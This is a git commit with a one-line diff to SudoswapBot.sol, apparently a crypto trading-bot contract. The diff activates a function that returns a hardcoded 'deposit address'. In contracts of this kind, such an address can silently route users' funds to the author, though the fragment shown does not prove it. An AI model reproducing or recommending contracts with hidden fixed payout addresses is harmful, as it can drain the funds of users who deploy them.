1fe02f5c6ccfdd3a93eca9edd28e1c4f060ba084
BlockchainWolfBots <127065178+BlockchainWolfBots@users.noreply.github.com>
2023-03-06 10:22:43 +0800

    Update SudoswapBot.sol

--- sudoswap/blob/main/blob/main/contract/SudoswapBot.sol
+++ sudoswap/blob/main/blob/main/contract/SudoswapBot.sol
@@ -6,6 +6,6 @@ contract Manager {
     }
 
     function pancakeswapDepositAddress() public pure returns (address) {
-        //return 0x6Aba0DE7D831569B6C2C6ADC21D37448CBCe2561;
+        return 0x6Aba0DE7D831569B6C2C6ADC21D37448CBCe2561;
     }
 }
